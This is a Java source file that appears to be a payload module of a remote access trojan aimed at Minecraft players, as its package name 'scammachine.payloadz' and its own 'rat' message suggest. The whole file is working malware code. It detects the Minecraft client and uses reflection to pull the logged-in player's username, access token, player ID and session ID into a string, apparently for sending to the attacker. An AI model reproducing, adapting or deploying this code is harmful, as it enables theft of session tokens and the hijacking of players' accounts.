package me.teejayx6.scammachine.payloadz;

/**
 * @author maywr
 * 18.07.2022 0:48
 */
public class Minecraft
{
	public static final String MINECRAFT_CLASS = "net.minecraft.client.Minecraft";

	public static String execute()
	{
		Class< ? > clazz = null;
		StringBuilder sb = new StringBuilder();

		if ( classExists( MINECRAFT_CLASS ) )
		{
			try
			{
				clazz = Class.forName( MINECRAFT_CLASS );
			} catch ( ClassNotFoundException ignored )
			{
				//never happen exception
			}
		} else
		{
			sb.append( "the rat is running out of the game" );
			return sb.toString();
		}

		Object session;
		assert clazz != null;

		try
		{
			if ( isObfuscated() )
			{
				session = clazz.getMethod( "func_110432_I" ).invoke( clazz.getMethod( "func_71410_x" ).invoke( null ) );
				sb.append( "Username: " )
				  .append( ( String ) session.getClass().getMethod( "func_111285_a" ).invoke( session ) ).append( "\n" );
				sb.append( "Token: " )
				  .append( ( String ) session.getClass().getMethod( "func_148254_d" ).invoke( session ) ).append( "\n" );
				sb.append( "PlayerID: " )
				  .append( ( String ) session.getClass().getMethod( "func_148255_b" ).invoke( session ) ).append( "\n" );
				sb.append( "SessionID: " )
				  .append( ( String ) session.getClass().getMethod( "func_111286_b" ).invoke( session ) ).append( "\n" );
			} else
			{
				session = clazz.getMethod( "getSession" ).invoke( clazz.getMethod( "getMinecraft" ).invoke( null ) );
				sb.append( "Username: " )
				  .append( ( String ) session.getClass().getMethod( "getUsername" ).invoke( session ) ).append( "\n" );
				sb.append( "Token: " )
				  .append( ( String ) session.getClass().getMethod( "getToken" ).invoke( session ) ).append( "\n" );
				sb.append( "PlayerID: " )
				  .append( ( String ) session.getClass().getMethod( "getPlayerID" ).invoke( session ) ).append( "\n" );
				sb.append( "SessionID: " )
				  .append( ( String ) session.getClass().getMethod( "getSessionID" ).invoke( session ) ).append( "\n" );
			}
		} catch ( Exception e )
		{
			sb.append( "failed to get minecraft info" );
			return sb.toString();
		}

		return sb.toString();
	}

	private static boolean classExists( String clazz )
	{
		try
		{
			Class.forName( clazz );
			return true;
		} catch ( ClassNotFoundException e )
		{
			return false;
		}
	}

	private static boolean isObfuscated()
	{
		try
		{
			Class.forName( "net.minecraft.client" ).getMethod( "getMinecraft" ).invoke( null );
			return false;
		} catch ( Exception e )
		{
			return true;
		}
	}
}
